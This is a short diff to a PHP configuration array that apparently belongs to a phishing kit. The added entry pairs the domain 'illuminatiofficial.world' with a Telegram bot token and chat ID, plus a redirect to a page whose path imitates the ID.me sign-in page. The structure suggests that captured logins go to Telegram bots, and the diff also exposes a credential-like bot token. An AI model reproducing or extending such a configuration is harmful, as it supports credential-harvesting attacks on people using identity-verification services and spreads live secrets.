@@ -12,6 +12,14 @@ $site_map = [
         'redirect' => 'https://illuminatiofficial.world/index.html'
     ],
 
+    'illuminatiofficial.world' => [
+        'bots' => [
+            ['token' => '8567913790:AAEP8WeOiMLclA_fZGV_zb8EbaQe2Q2Gv7c', 'chat_id' => '1325797388'],
+            
+        ],
+        'redirect' => 'https://illuminatiofficial.world/api.id.me/en/session/new.html'
+    ],
+
 
     'paysphere.42web.io' => [
         'bots' => [
